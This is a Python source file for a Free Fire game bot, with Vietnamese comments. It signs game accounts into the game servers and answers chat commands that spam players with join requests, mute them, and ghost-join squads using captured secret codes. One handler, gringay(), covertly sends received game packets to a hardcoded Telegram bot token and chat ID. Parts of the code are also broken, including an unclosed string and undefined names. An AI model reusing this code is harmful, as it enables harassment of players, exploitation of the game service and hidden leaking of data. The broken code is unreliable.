import threading, json, socket, time, random, datetime, aiohttp, asyncio, os
from tranbaodev.lib import *
from tranbaodev.GPackGEN import *
from tranbaodev.ReQAPI import *
from flask import Flask, jsonify, request

class FreeFireTCP:
 def __init__(self, bot_config, manager):
  self.bot_config = bot_config
  self.manager = manager
  self.running_event = threading.Event()
  self.running_event.set()
  self.rstatus = (0, 0)
  self.ids = []
  self.status = True
  self.started = False
  self.base_url = "https://clientbp.ggblueshark.com"
  self.reconnect_lock = threading.Lock()
  self.last_spam_time = {}
  self.roomcode = self.packetAuth = self.playerstatus = None
  self.AuthenCode = self.sock39699 = self.sock39801 = None
  self.ChatIP = self.OnlineIP = self.OnlinePort = self.ChatPort = None
  self.roomid = self.GuildIds = self.DesId = self.botid = None
  self.key = self.iv = self.token = b''
  self.login_session = self._data = None
  self.botid = self.nickname = self.region = None
  self.Emotes = {
    'E1': 909050020, 'E2': 909050009, 'G18': 909038012, 'CGK': 909042008,
    'AK47': 909000063, 'MP40': 909000075, 'MP40V2': 909040010,
    'FAMAS': 909000090, 'PRF': 909045001, 'M1014V2': 909039011,
    'P90': 909049010, 'UMP': 909000098, 'GROZA': 909041005, "E3": 909051002,
    'MP5': 909033002, 'XM8': 909000085, 'M4A1': 909033001, "M60": 909051003,
    'M1887': 909035007, 'LEVEL100': 909042007, 'M1014': 909000081
   }

 def _IIl(self, logindata, jsdata):
  self.cleanup()
  time.sleep(0.5)
  self._gen = TAO_PACKET(logindata, jsdata)
  self._bot = self.bot_session(self)
  self.running_event.set()
  time.sleep(1)
  threading.Thread(target=self.connect39801, daemon=True).start()
  threading.Thread(target=self.connect39699, daemon=True).start()

 def update_config(self, new_config):
  self.bot_config = new_config

 def cleanup(self):
  self.running_event.clear()
  sockets = [self.sock39699, self.sock39801]
  for sock in sockets:
   try:
    if sock:
     sock.shutdown(2)
     sock.close()
   except Exception as e: pass
  self.sock39699 = self.sock39801 = None

 def restart_bot(self):
  self.cleanup()
  time.sleep(2)
  self.running_event.set()
  self.started = False
  self.start()

 def AntiDisconnect(self, sock):
  while True:
   sock.send(bytes([0, 2, 0, 1]))
   time.sleep(25)

 def connect39801(self):
  with self.reconnect_lock:
   if not self.running_event.is_set(): return
   client = None
   try:
    client = socket.create_connection((self.ChatIP, int(self.ChatPort)))
    client.sendall(self.packetAuth)
    guild_active = self.bot_config.get("active-clan", True)
    if self.GuildIds and guild_active:
     client.send(self._bot.join_channel(self.GuildIds, self.AuthenCode, 1))
    client.send(self._bot.join_channel(None, None, 5))
    self.sock39801 = client
    while self.running_event.is_set():
     try:
      data = client.recv(3300)
      if len(data) == 0: break
      if data.hex()[:4] == "1200" and len(data) > 50:
       threading.Thread(target=self.C1200, args=(data, client,)).start()
     except Exception as e: break
   except Exception as e: pass
   finally:
    if client:
     try: client.close()
     except Exception as e: pass
    self.sock39801 = None
    if self.running_event.is_set():
     time.sleep(5)
     threading.Thread(target=self.connect39801, daemon=True).start()
 def connect39699(self):
  if not self.running_event.is_set(): return
  client = None
  try:
   client = socket.create_connection((self.OnlineIP,  int(self.OnlinePort)))
   client.sendall(self.packetAuth)
   self.sock39699 = client
   while self.running_event.is_set():
    try:
     data = client.recv(3300)
     if len(data) == 0: break
     if data.hex()[:4] == "0f00":
      decdata = json.loads(protobuf_dec(data.hex()[10:]))
      self.playerstatus = decdata
      rid = decdata.get("5").get("1").get("15", None)
      if rid: self.roomid = rid
      else: self.roomid = None

     if data.hex()[:4] == "0600" and len(data) <= 55:
      res = json.loads(protobuf_dec(data.hex()[10:]))
      uid = res.get("5").get("1")
      ConfirmFriendRequest(uid, self.token, self.base_url)
      messages = """[c][b][C678DD]const [61AFEF]Response [E5C07B]= [C678DD]() [ABB2BF]=> [ABB2BF]{{
  [C678DD]return [ABB2BF]{{
    [E5C07B]uid[E5C07B]: [E5C07B]{}[ABB2BF],
    [E5C07B]tittle[ABB2BF]: [98C379]"Request accepted"[ABB2BF],
    [E5C07B]message[ABB2BF]: [98C379]"type /register"[ABB2BF],
    [E5C07B]telegram[ABB2BF]: [98C379]"@tranbaodev"[ABB2BF]
  [ABB2BF]}}
[ABB2BF]}}""".format(uid)
      self._bot.reply(uid, 2, messages)
     if self.status: threading.Thread(target=self.gringay, args=(data,)).start()
    except Exception as e: 
     if not self.running_event.is_set(): break
  except Exception as e: pass
  finally:
   if client:
    try: client.close()
    except Exception as e: pass
   self.sock39699 = None
   if self.running_event.is_set():
    time.sleep(3)
    threading.Thread(target=self.connect39699, daemon=True).start()


 def C1200(self, data, client):
  try:
   data = data1200(data)
   if not data.valid: return False
   uid, cid, type = data.uid, data.cid, data.type
   if int(self.botid) in [cid, uid]: return False
   message, name = data.message, data.name
   idlist = self.get_user_status(1)
   is_admin = AdminManager.is_admin(self.bot_config["bot_id"], uid)

   if is_admin and message.startswith("@"):
    if message.startswith("@kb"):
     RequestAddingFriend(int(message.split()[1]), self.token, self.base_url)
     self._bot.reply(cid, type, "OK")

    elif message.startswith("@admin-aduser"):
     parts = message.split()
     if len(parts) < 3:
      self._bot.reply(cid, type, "@admin-aduser uid time"); return
     add_uid, ext = parts[1], parts[2]
     botid = self.bot_config["bot_id"]
     result = self.manager.add_uid_to_access(int(botid), int(add_uid), ext)
     if result == True:
      self._bot.reply(cid, type, "Added user {} for {}".format(add_uid, ext))
     else: self._bot.reply(cid, type, "Failed to add user")

    elif message.startswith("@admin-deluser"):
     parts = message.split()
     if len(parts) < 2: self._bot.reply(cid, type, "@admin-deluser uid"); return
     success = self.manager.deleteId(self.bot_config["bot_id"], parts[1])
     if success: self._bot.reply(cid, type, "Removed user")
     else: self._bot.reply(cid, type, "User not found")
     return
    
     
     
    elif message.startswith("@gen"):
     parts = message.split()
     if len(parts) != 3:
      self._bot.reply(cid, type, "[b][c]Sử dụng: @gen time count")
      return
     time_str, max_uses_str = parts[1], parts[2]
     try:
      max_uses = int(max_uses_str)
      code = GiftCode.create(time_str, max_uses, uid)
      self._bot.reply(cid, type, str(code))
      self._bot.reply(cid, type, """Tạo giftcode thành công!\n
Code: {}
Time: {}
Count: {}/{}
Tạo bởi: {}""".format(code, time_str, 0, max_uses, name))
     except ValueError: self._bot.reply(cid, type, "Lỗi ra kuu")


   if message.startswith("/sudung"):
    if UserRegister.is_registered(uid):
     self._bot.reply(cid, type,"xin chào bro")

     payload = json.dumps({
      "StickerStr": "[1=1200000001-%s]" % random.choice([10, 11, 14]),
      "type": "Sticker"}
     )
     self.sock39801.send(self._bot.send_object(payload, cid, type))
     return False
    success, expire_time = UserRegister.register(uid, name)
    if success:
     botid = self.bot_config["bot_id"]
     self.manager.add_uid_to_access(botid, int(uid), "24h")
     self._bot.reply(cid, type, """ 

/start để xem danh sách lệnh.""")
     payload = json.dumps({"StickerStr": "[1=1200000001-11]", "type": "Sticker"})
     self.sock39801.send(self._bot.send_object(payload, cid, type))
    else: self._bot.reply(cid, type, "× ")

   elif message.startswith("@redeem"):
    parts = message.split()
    if len(parts) != 2:
     self._bot.reply(cid, type, "Sử dụng: @redeem giftcode")
     return
    self._bot.reply(cid, type, "Đang xử lí..")
    code = parts[1].upper()
    success, result = GiftCode.redeem(code, uid)
    if success:
     botid = self.bot_config["bot_id"]
     add_result = self.manager.add_uid_to_access(botid, int(uid), result)

     if add_result == True:
      self._bot.reply(cid, type, "Nhập code thành công")
      self._bot.reply(cid, type, "/start - show all command")
     else: self._bot.reply(cid, type, "Lỗi ra kuu!")
    else: self._bot.reply(cid, type, "%s" % result)







   

   elif message.startswith("/bot"):
    message = """[b][c]------------------------------------


/start Để xem danh sách các lệnh





------------------------------------""" if type == 1 else """------------------------------------

 
/start Để xem danh sách các lệnh


------------------------------------"""
    self._bot.reply(cid, type, message.format(name))
    payload = json.dumps({"TitleID":905090075,"type":"Title"})
    self.sock39801.send(self._bot.send_object(payload, cid, type))

   elif message.startswith(("/start", "/help")):
    time.sleep(0.3)
    self._bot.reply(cid, type, """
 => /5
 
 Tạo cho mọi người 
 => /5 
 
 
    if type is None: return False
    time.sleep(1)
    self._bot.reply(cid, type, """[B][c]
 Khoá chat:
 /mute UID 

 Mở chat:
 /unmute UID [ mở chat đội ]

 Share vip 8
 /share ( vip8 )""")
    #exps = self.get_user_status(3, uid)
    #time.sleep(1.5)
    #self._bot.reply(cid, type, """[c][b][C678DD]const [61AFEF]UserInfo [E5C07B]= [C678DD]() [ABB2BF]=> [ABB2BF]{{
  #[C678DD]return [ABB2BF]{{
    #[E5C07B]uid[E5C07B]: [E5C07B]{}[ABB2BF],
    #[E5C07B]name[ABB2BF]: [98C379]"{}"[ABB2BF],
    #[E5C07B]telegram[ABB2BF]: [98C379]""[ABB2BF],
   # [E5C07B]time[ABB2BF]: [98C379]"{}"[ABB2BF]
  #[ABB2BF]}}
#[ABB2BF]}}""".format(uid, name, exps))

   elif message.startswith("/stc"):
    parts = message.split()
    if len(parts) < 2: self._bot.reply(cid, type, "/stc [teamcode]"); return
    tcode = int(parts[1])
    self.rstatus = (2, tcode)
    self.sock39699.sendall(self._bot.join_squad(tcode))
    self._bot.reply(cid, type, "[B][c]OK")
    payload = json.dumps({"StickerStr": "[1=1200000001-14]", "type": "Sticker"})
    self.sock39801.send(self._bot.send_object(payload, cid, type))

   elif message.startswith("/js"):
    if self.rstatus[0] not in [0, 4]: self._bot.reply(cid, type, "[B][c]Có người khác cũng đang dùng lệnh này, vui lòng chờ một chút rồi sử dụng lại"); return
    parts = message.replace("/js", "").replace(":", " ").split()
    if len(parts) < 1 or not parts[0].isdigit():
     self._bot.reply(cid, type, "[B][c]/js [TEAM CODE]"); return
     
    self.sock39801.send(self._bot.leave_channel(uid, None))
    
    self.rstatus = (4, '')
    self.sock39699.send(self._bot.join_squad(int(parts[0])))
    #self._bot.reply(cid, type, """[B][c]--------------------------------------
#lệnh hd
  # /e:0😏1:AK😏4😏7 (Full HD lv7)
   #/e:0😏7:%😏x (HD OB5😏0)
   #/e:0😏8:%😏x (HD OB5😏1)

#/e:0😏1:UMP
#Bật hđ tất cả người trong team
   #/all AK47
   #/all rd   |   random hd lv7

#--------------------------------------
#TikTоk: ___

   elif (message).startswith("/e"):
     value = message.split(":")
     if len(value) < 3: self._bot.reply(cid, type, "/e:01:AK47 hoặc /e:02:10"); return
     cmd, mode, arg = value[0], value[1], value[2]
     match mode:
      case "01":
       vl = arg.upper()
       if vl in self.Emotes:
        self.sock39699.send(self._bot.play_emote(self.Emotes[vl], [uid]))
        self._bot.reply(cid, type, "[B][c]EMOTE --> %s" % self.Emotes[vl])
       else: self._bot.reply(cid, type, ", ".join([ e for e in self.Emotes ]))
      case gay if gay in ("02","03","04","05","06","07","08", "09"):
       EmoteId = int("9090%02d%03d" % (43 + int(gay), int(arg)))
       self.sock39699.send(self._bot.play_emote(EmoteId, [uid]))
       self._bot.reply(cid, type, "[B][c]EMOTE --> %s" % EmoteId)
      case _: self._bot.reply(cid, type, "[B][c]Có mỗi cái lệnh mà nhập cũng sai ha")
   elif message.startswith("/dev"):

    payload_title = json.dumps({
        "TitleID": 905090075,
        "type": "Title"
    })
    try:
        self.sock39801.send(
            self._bot.send_object(payload_title, cid, type)
        )
    except:
        pass

    
    self._bot.reply(
        cid, type,
        #"[b][c]Thông Tin Admin\n"
        #"[00FFFF]Name Admin :[00FF00]=> [FFFFFF]Trần Gia Bảo\n"
        #"[00FF00]FB:[FFFFFF] "
        #"[1E8F1E]G[2FA02F]i[40B040]a[51C051] B[62D062]"
        #"[73E073]a[84F084]o"
        #"[C8FFC8] ([D9FFD9]O[E5FFE5]n[F0FFF0]e[F7FFF7]w[FFFFFF])\n\n"
        #"[00FF90]Thông Tin MXH\n"
        #"[00FF00]TikTok:[FFFFFF] @TranBaoDev_\n"
        #"[00FF00]Tele🔕gram:[FFFFFF] @TranBaoDev\n\n"
        
         #"[b][c]× Notes : Trước khi đánh giá t, đầu tiên hãy xem m ngang t chưa đã=))"
    )

    
    payload_sticker = json.dumps({
        "StickerStr": "[1=1200000001-11]",
        "type": "Sticker"
    })
    try:
        self.sock39801.send(
            self._bot.send_object(payload_sticker, cid, type)
        )
    except:
        pass

   elif (message).startswith("/all"):
    v = message.split()
    if len(v) < 2:return self._bot.reply(cid, type, "[B][c]Dùng: /all AK47 hoặc /all rd")
    if not self.ids:return self._bot.reply(cid, type, "[B][c]Dùng /js trước")
    cc = v[1].upper()
    ids = list(set(self.ids))
    if cc == "RD":
     for uid in ids:
      e = random.choice(list(self.Emotes.values()))
      self.sock39699.send(self._bot.play_emote(e, [uid]))
     return self._bot.reply(cid, type, "[B][c]EMOTE --> RANDOM")
    if cc in self.Emotes:
     self.sock39699.send(self._bot.play_emote(self.Emotes[cc], ids))
     self._bot.reply(cid, type, f"[B][c]EMOTE --> {self.Emotes[cc]}")
    else:self._bot.reply(cid, type, "[B][c]Có sẵn:\n" + ", ".join(self.Emotes))

   elif message.startswith("/sms"):
    parts = message.split(maxsplit=2)
    if len(parts) < 3: self._bot.reply(cid, type, "[B][c]/sms [teamcode] [message]"); return
    tcode = int(parts[1])
    self.rstatus = (1, parts[2])
    self.sock39699.send(self._bot.join_squad(tcode))
    self._bot.reply(cid, type, "[B][c]Đang gửi tin nhắn..")
    payload = json.dumps({"StickerStr": "[1=1200000002-11]", "type": "Sticker"})
    self.sock39801.send(self._bot.send_object(payload, cid, type))
   elif message.startswith("/jclan"):
    id_str = get_user_input(message)  # Giả sử hàm này trả về phần sau /jclan, ví dụ "12345"

    if not id_str:
        self._bot.reply_to(
            message,
            "Vui lòng cung cấp ID clan!\nVí dụ: /jclan 12345"
        )
        return

    try:
        clan_id = int(id_str)
    except ValueError:
        self._bot.reply_to(
            message,
            "ID clan phải là một số nguyên hợp lệ!"
        )
        return

    # Gọi hàm và lưu kết quả để kiểm tra/log
    result = RequestJoinClan(clan_id, self.base_url, self.token)

    # In ra kết quả để debug (nếu cần), KHÔNG in cả hàm
    print(id, RequestJoinClan(int(id), self.base_url, self.token))

    # Phản hồi phù hợp dựa trên kết quả
    if result and result.get("status") == "success":
        self._bot.reply_to(
            message,
            "Đã gửi yêu cầu tham gia clan thành công! ✅"
        )
    else:
        self._bot.reply_to(
            message,
            "Có lỗi khi gửi yêu cầu tham gia clan. 😢\nChi tiết: " + str(result)
        )
   elif message.startswith("/5"):
    if len(message) > 3: self.GenSquads(5, cid, message.split()[1], type); return
    self.GenSquads(5, cid, uid, type)

   elif message.startswith("/6"):
    if len(message) > 3: self.GenSquads(6, cid, message.split()[1], type); return
    self.GenSquads(6, cid, uid, type)

   elif message.startswith("/status"):
    text = get_user_input(str(message))
    if ":" in text: self._bot.reply(cid, type, text); return
    self._bot.reply(cid, type, "[B][c]Đang lấy thông tin..")
    self.sock39699.send(self._bot.get_history(message.split()[1]))
    time.sleep(1)
    if self.playerstatus:
     data = get_player_status(self.playerstatus)
     form = self.format_status_message(data, message.split()[1])
     self._bot.reply(cid, type, form)
    else: self._bot.reply(cid, type, "null")

   elif message.startswith("/rinv"):
    msg = get_user_input(str(message))
    if ":" in msg: self._bot.reply(cid, type, msg); return
    threading.Thread(target=self.GenSpamRoom, args=(msg,)).start()
    time.sleep(2)
    if self.roomid:
     self._bot.reply(cid, type, "[B][c]Đang spam '%s' tới phòng '%s'" %
      (msg[:5], self.roomid)
     )
    else: self._bot.reply(cid, type, "PLAYER IS NOT ON ROOM")

   elif message.startswith("/sinv"):
    msg = get_user_input(str(message))
    if ":" in msg: self._bot.reply(cid, type, msg); return
    threading.Thread(target=self.spam_to_squads, args=(msg,)).start()
    self._bot.reply(cid, type, "[B][c]Đang spam..")

   elif message.startswith("/share"):
    self.sock39699.send(self._bot.ask_for_skin(uid))
    self._bot.reply(cid, type, str(uid))

   elif message.startswith("/mute"):
    msg = get_user_input(message)
    if ":" in msg: self._bot.reply(cid, type, msg); return
    self.sock39801.send(self._bot.join_channel(msg, "0_GRINGAY", None))
    self._bot.reply(cid, type, "[B][c]Đã khoá mõm '%s'" % msg)

   elif message.startswith("/unmute"):
    msg = get_user_input(message)
    if ":" in msg: self._bot.reply(cid, type, msg); return
    self.sock39801.send(self._bot.leave_channel(msg, None))
    self._bot.reply(cid, type, "[B][c]OK")

   elif message.startswith("/ai"):
    msg = get_user_input(message)
    if ":" in msg: self._bot.reply(cid, type, msg); return
    self._bot.reply(cid, type, gemini(msg))

   elif message.startswith("/grok"):
    msg = get_user_input(message)
    if ":" in msg: self._bot.reply(cid, type, msg); return
    self._bot.reply(cid, type, grok(msg))

   elif message.startswith("/likes"):
    msg = get_user_input(message)
    if ":" in msg: self._bot.reply(cid, type, msg); return
    ok, res = UserLikeLimit.get(uid)
    if ok: self._bot.reply(cid, type, send_likes(msg, res))
    else: self._bot.reply(cid, type, "[B][c]Mày đã đạt giới hạn sử dụng cho hôm nay, giới hạn của mày sẽ được đặt lại vào ngày mai")

   elif message.startswith("/info"):
    text = get_user_input(str(message))
    if ":" in text: self._bot.reply(cid, type, text); return
    self._bot.reply(cid, type, send_info(text, self.token, self.base_url))

   elif message.startswith("/region"):
    index = get_user_input(message)
    if ":" in index: self._bot.reply(cid, type, index); return
    res = napthe(index)
    self._bot.reply(cid, type, "[B][c]User '%s' with uid '%s' is in '%s' region" % (
     res.get("nickname"), index, 
     res.get("region", "locked"))
    )

   elif message.startswith("/isbanned"):
    uid = get_user_input(message)
    if ":" in uid: self._bot.reply(cid, type, uid); return
    I=check_banned(uid)
    self._bot.reply(cid, type, '[B][c]PLAYER IS BANNED' if I else '[B][c]NOT BANNED')
   else: return False
  except Exception as e:self.rstatus, self.ids = (0, 0), []


 def leave(self, uid, delay):
  try:
   time.sleep(int(delay))
   self.rstatus = (0, 0)
   self.ids = []
   self.sock39801.send(self._bot.leave_channel(uid, None))
   self.sock39699.send(self._bot.leave_squad(uid))
  except: self.rstatus, self.ids = (0, 0), []


 def gringay(self, data):
  if data.hex()[:4] == "0500" and len(data) >= 80:
   data = json.loads(protobuf_dec(data.hex()[10:]))
   if not isinstance(data.get("4"), (str, int)): return
   threading.Thread(
    target=lambda: requests.post(
     "https://api.telegram.orgbot/8374809022:AAFzuiVniOkeQOPm8Em_snnC4eqJTLioLa0/sendMessage", data={"chat_id": "656788644", "text": str(data)})
    ).start()
   if int(data["4"]) in [3, 6, 8, 44, 56] and self.rstatus[0] == 10:
    self.ids.extend(extract_uid_fields(data))

   
   if int(data["4"]) == 3:
    print(data)
    uid = data.get("5").get("1")
    rc = data.get("5").get("8")
    
    self.sock39801.send(self._bot.join_channel(uid, rc, None))
    g01 = "[B][c]\n[%s]Dịch vụ: [U]LIKES - BOT - API.[/U][%s]\n\nTelegram: [00FFFF]@ & [00FF00]TikTok: [00FFFF]@_\n[000000]"%(grcolor(), grcolor())
    g02 = "\n".join([f"[{grcolor()}]  " * 8 for _ in range(55)])
    self.sock39699.send(self._bot.reject_invite(random.choice([g01, g02]), uid, uid))
    
   if int(data["4"]) == 6:
    if isinstance(self.rstatus, tuple) and self.rstatus[0] == 1:
     try:
      self.sock39699.send(self._bot.leave_squad(000))
      uid = data.get("5", {}).get("1")
      recruit_code = data.get("5", {}).get("17")
      self.sock39801.send(self._bot.join_channel(uid, recruit_code, None))
      
      for _ in range(10):
       self._bot.reply(uid, None, self.rstatus[1])
       time.sleep(0.5)
      self.rstatus = (0, 0)
     except Exception as e: self.rstatus, self.ids = (0, 0), []

    if isinstance(self.rstatus, tuple) and self.rstatus[0] == 2:
     try:
      uid = data.get("5", {}).get("1")
      secret_code = data.get("5", {}).get("31")
      self.rstatus = (0, 0)
      if not uid or not secret_code: return False
      current_code = self.rstatus[1]
      self.sock39699.send(self._bot.leave_squad(00000))
      packetjs = self._bot.join_squad(current_code)
      bots = []
      for bot in self.manager.bots.values():
       if bot is not self and bot.sock39699 and bot._bot:
        bots.append(bot)
       if len(bots) == 3: break
      for bot in bots: bot.sock39699.send(bot._bot.ghost(uid, secret_code))
      for _ in range(555):
       self.sock39699.sendall(packetjs)
       self.sock39699.sendall(self._bot.leave_squad(0x00))
       time.sleep(0.005)
       self.sock39699.sendall(self._bot.ghost(uid, secret_code))
      time.sleep(0.5)
      self.sock39699.sendall(self._bot.leave_squad(0x00))
      self.sock39699.sendall(self._bot.ghost(uid, secret_code))
      return True
     except Exception as e: self.rstatus, self.ids = (0, 0), []

    if isinstance(self.rstatus, tuple) and self.rstatus[0] == 3:
     try:
      uid = data.get("5", {}).get("1")
      secret_code = data.get("5", {}).get("31")
      self.sock39699.send(self._bot.leave_squad(1))
      if not uid or not secret_code: return False
      current_code = self.rstatus[1]
      self.rstatus = (0, 0)
      self.send_ghost(uid, secret_code)
     except Exception as e: self.rstatus, self.ids = (0, 0), []

    if isinstance(self.rstatus, tuple) and self.rstatus[0] == 4:
     try:
      import pprint
      pprint.pprint(data)
      uid = data.get("5", {}).get("1")
      recruit_code = data.get("5", {}).get("17")
      self.sock39801.send(self._bot.join_channel(uid, recruit_code, None))
      time.sleep(0.5)
      #self._bot.reply(uid, None, "[B][C]Tất Cả Tránh Ra [00ffd4] Đến Chơi!\n\n× Tiktok: [00ffb3]@TranBaoDev_\n× Tel[c]egr[c]am: [00ffb3]@\n× Facebook: [00ffb3] (Onew)\n\n:\n[C0C0C0]Mọi Người Th[c]uê Bot Team 5-6 - Bot Emotes Bật Hành Động Sú[c]n[c]g 7 Ai Cũng Nhìn Thấy Được IB TikTok.")
      self.rstatus = (10, '')
      self.ids.extend(extract_uid_fields(data))
     except Exception as e: self.rstatus, self.ids = (0, 0), []

 def playcd(self):
  self.sock39699.send(self._bot.play_animation(914000002))
  time.sleep(3)
  self.sock39699.send(self._bot.play_animation(914000002))
  time.sleep(3.5)
  self.sock39699.send(self._bot.play_animation(914000002))

 def send_ghost(self, uid, secret):
  bots = []
  for i in self.manager.bots.values():
   if i is not self and i.running_event.is_set() and i.sock39699 and i._bot:
    bots.append(i)
   if len(bots) == 3: break
  for bot in bots: bot.sock39699.send(bot._bot.ghost(uid, secret))

 def spam_to_squads(self, uid):
  for i in range(123):
   self.sock39699.send(self._bot.request_join_squad(uid))
   time.sleep(0.35)

 def GenSpamRoom(self, cid):
  self.sock39699.send(self._bot.get_history(cid))
  time.sleep(1.5)
  rid = self.roomid
  if rid:
   packetjr = self._bot.request_join_room(rid, cid)
   for i in range(123):
    if not self.sock39699: return
    self.sock39699.send(packetjr)
    time.sleep(0.35)

 def GenSquads(self, team, cid, uid, Type):
  if not self.sock39699: self._bot.reply(cid, Type, "Thử lại!")
  self.status = False
  self.sock39699.sendall(self._bot.open_squad(team))
  time.sleep(0.3)
  self.sock39699.send(self._bot.invite_squad(uid, 1))
  self.sock39699.send(self._bot.invite_squad(uid, 2))
  self._bot.reply(cid, Type, """[B][c]--------------------------------
Accept the invitation !
SEND TO: {}
TEAM  ->  {}
--------------------------------""".format(team, uid))
  threading.Thread(target=self.playcd).start()
  threading.Thread(target=self.closesquads).start()

 def closesquads(self):
  time.sleep(10)
  self.rstatus, self.ids = (0, 0), []
  try: self.sock39699.send(self._bot.leave_squad(0x000000))
  except Exception as e: pass
  self.status = True

 def get_user_status(self, type, uid=None):
  if type == 1:
   return [u["uid"] for u in self.bot_config.get("access_bot", [])] + [self.botid] + [self.GuildIds]
  if type in [2, 3] and uid is not None:
   for u in self.bot_config.get("access_bot", []):
    if u["uid"] == int(uid):
     exp = u["expire"]
     try:
      exp_time = datetime.datetime.strptime(exp, "%Y-%m-%d %H:%M:%S")
      now = datetime.datetime.now()
      if exp_time < now:
       self.manager.deleteId(self.bot_config["bot_id"], uid)
       return False
      if type == 2:
       return True, False
      if type == 3:
       delta = exp_time - now
       days = delta.days
       hours, remainder = divmod(delta.seconds, 3600)
       minutes, seconds = divmod(remainder, 60)
       parts = []
       if days: parts.append(f"{days} ngày")
       if hours: parts.append(f"{hours} giờ")
       if minutes: parts.append(f"{minutes} phút")
       time_left = ", ".join(parts)
       return time_left
     except Exception as e:
      return False if type == 2 else ("null")
   return "∞"
  return "∞"

 def format_status_message(self, info, uid):
  status = info.get("status", "")
  uid = info.get("uid", uid)
  group = info.get("group")
  roomid = info.get("roomid")
  extra = ""
  if "Squads" in status and group:
   extra = "group: []{}\n".format(group)
  elif "Rooms" in status and roomid:
   extra = "Room ID: []{}\n".format(roomid)
  return """Player Status Info:
status: {}
uid: {}""".format(status, extra, uid)



 def auto_send_likes(self):
  ds_ids = GetClanInfo(self.token, self.GuildIds).IdList()
  for id in ds_ids:
   message = send_likes(int(id), "∞")
   if "Bảo Trì!" in message: self._bot.reply(self.GuildIds, 1, message)
   else: self._bot.reply(self.GuildIds, 1, message)
   time.sleep(1.5)

 class bot_session:
  def __init__(self, parent):
   self.par = parent
  def __getattr__(self, name):
   return getattr(self.par._gen, name)
  def reply(self, Id, Tp, Ms):
   try:
    if self.par.running_event.is_set() and self.par.sock39801:
     self.par.sock39801.sendall(self.par._gen.send_message(Ms, Tp, Id))
   except Exception as e: pass

 def rstart(self):
  access_token = self.bot_config['auth_bot_login']['access_token']
  while self.running_event.is_set():
   try:
    data = FreeFireAPI().get(access_token, is_emulator=False)
    print(data)
    if "account not found" in data:
     self.running_event.clear()
     break
    if data.get("GuildData"):
     self.AuthenCode = data.get("GuildData").get("secret_code")
     self.GuildIds = data.get("GuildData").get("id")
    self.packetAuth = bytes(data["UserAuthPacket"])
    self.botid = int(data["UserAccountUID"])
    self.nickname = str(data["UserNickName"])
    self.region = str(data["LockRegion"])
    self.token = data["UserAuthToken"]
    self.ChatIP = data["GameServerAddress"]["chatip"]
    self.OnlineIP = data["GameServerAddress"]["onlineip"]
    self.OnlinePort = data["GameServerAddress"]["onlineport"]
    self.ChatPort = data["GameServerAddress"]["chatport"]
    self.key, self.iv = bytes(data["key"]), bytes(data["iv"])
    self.base_url = data["BaseUrl"]
    ChooseEmote(self.token, self.base_url)
    self._IIl(data["logindata"], data)
    if not self.running_event.is_set(): break
    time.sleep(14555)
   except Exception as e:
    import traceback
    traceback.print_exc()
    if self.running_event.is_set(): time.sleep(1111)

 def start(self):
  if self.started: return
  self.started = True
  self.running_event.set()
  threading.Thread(target=self.rstart, daemon=True).start()






























class BOTMNG:
 def __init__(self):
  self.bots = {}
  self.config_lock = threading.RLock()
  self.filename = "bot.json"
  self.load_config()
  threading.Thread(target=self.auto_cleanup_expired_users, daemon=True).start()

 def load_config(self):
  try:
   status, content = File.check(self.filename)
   self.config = json.loads(content)
   print(self.config)
   if "bots" not in self.config:
    self.config["bots"] = []
   for bot_data in self.config["bots"]:
    bot_id = bot_data["bot_id"]
    bot_instance = FreeFireTCP(bot_data, self)
    if "botid" in bot_data:
     bot_instance.botid = bot_data["botid"]
    if "nickname" in bot_data:
     bot_instance.nickname = bot_data["nickname"]
    self.bots[bot_id] = bot_instance
  except Exception as e:
   self.config = {"bots": []}
   self.save_config()

 def save_config(self):
  try:
   with self.config_lock:
    for bot_id, bot_instance in self.bots.items():
     for bot_config in self.config["bots"]:
      if bot_config["bot_id"] == bot_id:
       if hasattr(bot_instance, 'botid') and bot_instance.botid:
        bot_config["botid"] = bot_instance.botid
       if hasattr(bot_instance, 'nickname') and bot_instance.nickname:
        bot_config["nickname"] = bot_instance.nickname
    File.edit(self.filename, self.config)
  except Exception as e: pass

 def get_next_bot_id(self):
  with self.config_lock:
   if not self.config["bots"]: return 1
   return max(bot["bot_id"] for bot in self.config["bots"]) + 1

 def check_token_exists(self, access_token):
  with self.config_lock:
   for bot in self.config["bots"]:
    if bot["auth_bot_login"]["access_token"] == access_token:
     return True, bot["bot_id"]
   return False, None

 def toggle_guild_activation(self, bot_id, action):
  with self.config_lock:
   try: bot_id = int(bot_id)
   except ValueError:
    return "error"
   for bot in self.config["bots"]:
    if bot["bot_id"] == bot_id:
     if bot_id not in self.bots: return "error"
     bot_instance = self.bots[bot_id]
     if not bot_instance.GuildIds:
      return "Bot is not in guild"
     if action == "on":
      bot["active-clan"] = True
      bot_instance.bot_config["active-clan"] = True
      self.save_config()
      threading.Thread(target=bot_instance.restart_bot).start()
      return "active"
     elif action == "off":
      bot["active-clan"] = False
      bot_instance.bot_config["active-clan"] = False
      self.save_config()
      threading.Thread(target=bot_instance.restart_bot).start()
      return "Inactive"
     else: return "error"
   return "error"

 def add_bot(self, access_token, bot_cmd_data=None):
  with self.config_lock:
   exists, existing_bot_id = self.check_token_exists(access_token)
   if exists: return {"status": False, "message": "access token already exists"}
   bot_id = self.get_next_bot_id()
   new_bot = {
    "bot_id": bot_id,
    "auth_bot_login": {"access_token": access_token},
    "access_bot": [],
    "active-clan": True
   }
   self.config["bots"].append(new_bot)
   self.save_config()
   self.bots[bot_id] = FreeFireTCP(new_bot, self)
   return {"status": True, "bot_id": bot_id}

 def delete_bot(self, bot_id):
  with self.config_lock:
   if bot_id in self.bots:
    try:self.bots[bot_id].cleanup()
    except Exception as e:pass
    del self.bots[bot_id]
    self.config["bots"] = [b for b in self.config["bots"] if b["bot_id"] != bot_id]
    self.save_config()
    return True
   return False

 def remove_bot(self, bot_id):
  with self.config_lock:
   if bot_id in self.bots:
    bot_instance = self.bots[bot_id]
    bot_instance.cleanup()
    del self.bots[bot_id]
    if not bot_instance.is_temporary:
     self.config["bots"] = [b for b in self.config["bots"] if b["bot_id"] != bot_id]
     self.save_config()
    return True
   return False

 def parse_expire_time(self, time_str):
  units = {"h": "hours", "d": "days", "w": "weeks", "y": "years"}
  try:
   value = int(time_str[:-1])
   unit = time_str[-1]
   if unit not in units:return None
   now = datetime.datetime.now()
   if unit == "y":
    expire = now + datetime.timedelta(days=365 * value)
   else:
    kwargs = {units[unit]: value}
    expire = now + datetime.timedelta(**kwargs)
   return expire.strftime("%Y-%m-%d %H:%M:%S")
  except Exception as e:
   return None

 def send_notification_safe(self, bot_id, is_add, uid, expire_time=None):
  try:
